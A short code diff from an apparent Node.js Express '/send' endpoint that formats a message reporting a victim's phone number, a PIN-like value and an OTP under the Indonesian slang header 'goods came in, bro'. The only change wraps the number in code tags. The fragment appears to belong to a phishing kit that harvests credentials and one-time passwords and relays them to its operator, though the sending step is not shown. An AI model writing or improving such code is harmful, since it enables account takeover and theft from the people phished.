@@ -80,7 +80,7 @@ app.post("/send", async(req,res) =>{
         const text = `
 💳 <b>| BARANG MASUK BANG |</b> 💳
 
-×  NMR  ×   : ${nmrx}
+×  NMR  ×   : <code>${nmrx}</code>
 ×  POX   ×   : ${pix}
 ×  OXT   ×   : ${otp}
 
